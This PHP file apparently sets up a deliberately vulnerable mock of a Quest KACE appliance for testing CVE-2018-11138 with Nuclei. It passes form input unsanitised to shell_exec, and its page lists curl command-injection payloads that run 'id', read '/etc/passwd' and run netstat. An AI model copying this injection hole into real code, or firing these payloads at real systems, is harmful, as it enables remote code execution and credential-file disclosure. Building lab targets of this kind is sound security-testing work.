<?php
// Quest KACE System Management Appliance - Vulnerable Test Application
// This simulates the vulnerable system for CVE-2018-11138 testing

// Set content type
header('Content-Type: text/html; charset=utf-8');

// Check if this is a POST request to the vulnerable endpoint
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/common/download_agent_installer.php') {
    $platform = $_POST['platform'] ?? '';
    $custom_install_options = $_POST['custom_install_options'] ?? '';
    
    // Vulnerable code - command injection in custom_install_options
    if (!empty($custom_install_options)) {
        // This is the vulnerable part - command injection
        $command = "echo 'Installing agent for platform: " . $platform . "' && " . $custom_install_options;
        
        // Execute the command (this is the vulnerability)
        $output = shell_exec($command);
        
        // Return the output
        echo "<html><head><title>KACE Agent Installer</title></head><body>";
        echo "<h1>Quest KACE System Management Appliance</h1>";
        echo "<h2>Agent Installation</h2>";
        echo "<p><strong>Platform:</strong> " . htmlspecialchars($platform) . "</p>";
        echo "<p><strong>Install Options:</strong> " . htmlspecialchars($custom_install_options) . "</p>";
        echo "<p><strong>Output:</strong></p>";
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
        echo "<p><em>Note: This is a vulnerable test environment for CVE-2018-11138</em></p>";
        echo "</body></html>";
    } else {
        echo "<html><head><title>KACE Agent Installer</title></head><body>";
        echo "<h1>Quest KACE System Management Appliance</h1>";
        echo "<h2>Agent Installation</h2>";
        echo "<p>No custom install options provided.</p>";
        echo "</body></html>";
    }
    exit;
}

// Main page
?>
<!DOCTYPE html>
<html>
<head>
    <title>Quest KACE System Management Appliance</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: #f0f0f0; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .endpoint { background: #e9ecef; padding: 10px; border-radius: 3px; font-family: monospace; margin: 5px 0; }
        .test-form { background: #f8f9fa; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .test-form input[type="text"] { width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 3px; }
        .test-form input[type="submit"] { background: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
        .test-form input[type="submit"]:hover { background: #0056b3; }
        .info-box { background: #d1ecf1; border: 1px solid #bee5eb; padding: 15px; border-radius: 5px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Quest KACE System Management Appliance</h1>
            <p><strong>Version:</strong> 8.0.318 (Vulnerable)</p>
            <p><strong>Status:</strong> Running</p>
            <p><strong>Build Date:</strong> January 15, 2024</p>
        </div>
        
        <div class="warning">
            <h3>‚ö†Ô∏è Security Warning</h3>
            <p>This is a <strong>vulnerable test environment</strong> for CVE-2018-11138.</p>
            <p><strong>Do not use in production or expose to the internet.</strong></p>
            <p>This application is designed for educational and authorized security testing purposes only.</p>
        </div>
        
        <div class="info-box">
            <h3>üìã Vulnerability Information</h3>
            <p><strong>CVE:</strong> CVE-2018-11138</p>
            <p><strong>Severity:</strong> Critical (CVSS 9.8)</p>
            <p><strong>Type:</strong> Remote Code Execution (RCE)</p>
            <p><strong>Vector:</strong> Command injection in <code>/common/download_agent_installer.php</code></p>
        </div>
        
        <h2>üîß Available Endpoints</h2>
        <ul>
            <li><span class="endpoint">/common/download_agent_installer.php</span> - Vulnerable RCE endpoint</li>
            <li><span class="endpoint">/admin/</span> - Administration panel (not implemented)</li>
            <li><span class="endpoint">/api/</span> - API endpoints (not implemented)</li>
        </ul>
        
        <h2>üß™ Test the Vulnerability</h2>
        <div class="test-form">
            <h3>Manual Test Form</h3>
            <form method="POST" action="/common/download_agent_installer.php">
                <label>Platform:</label>
                <input type="text" name="platform" value="linux" required>
                
                <label>Custom Install Options (Command Injection):</label>
                <input type="text" name="custom_install_options" placeholder=";id;echo+" required>
                
                <input type="submit" value="Test Vulnerability">
            </form>
        </div>
        
        <h2>üíª Command Line Testing</h2>
        <p>Use the following commands to test the RCE vulnerability:</p>
        
        <h3>Basic Command Execution:</h3>
        <div class="endpoint">
            curl -X POST http://localhost/common/download_agent_installer.php \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -d "platform=linux&custom_install_options=;id;echo+"
        </div>
        
        <h3>File Read:</h3>
        <div class="endpoint">
            curl -X POST http://localhost/common/download_agent_installer.php \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -d "platform=linux&custom_install_options=;cat+/etc/passwd;echo+"
        </div>
        
        <h3>Network Reconnaissance:</h3>
        <div class="endpoint">
            curl -X POST http://localhost/common/download_agent_installer.php \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -d "platform=linux&custom_install_options=;netstat+-an;echo+"
        </div>
        
        <h2>üîç Nuclei Template Testing</h2>
        <p>Test with the Nuclei template:</p>
        <div class="endpoint">
            nuclei -u http://localhost -t http/cves/2018/CVE-2018-11138.yaml -debug
        </div>
        
        <h2>üìö References</h2>
        <ul>
            <li><a href="https://www.coresecurity.com/advisories/quest-kace-system-management-appliance-multiple-vulnerabilities" target="_blank">Core Security Advisory</a></li>
            <li><a href="https://www.exploit-db.com/exploits/44950/" target="_blank">Exploit-DB</a></li>
            <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-11138" target="_blank">NVD</a></li>
            <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11138" target="_blank">CVE Details</a></li>
        </ul>
        
        <div class="warning">
            <h3>üîí Disclaimer</h3>
            <p>This application is provided for educational and authorized security testing purposes only. 
            Always ensure you have proper authorization before testing any systems.</p>
        </div>
    </div>
</body>
</html> 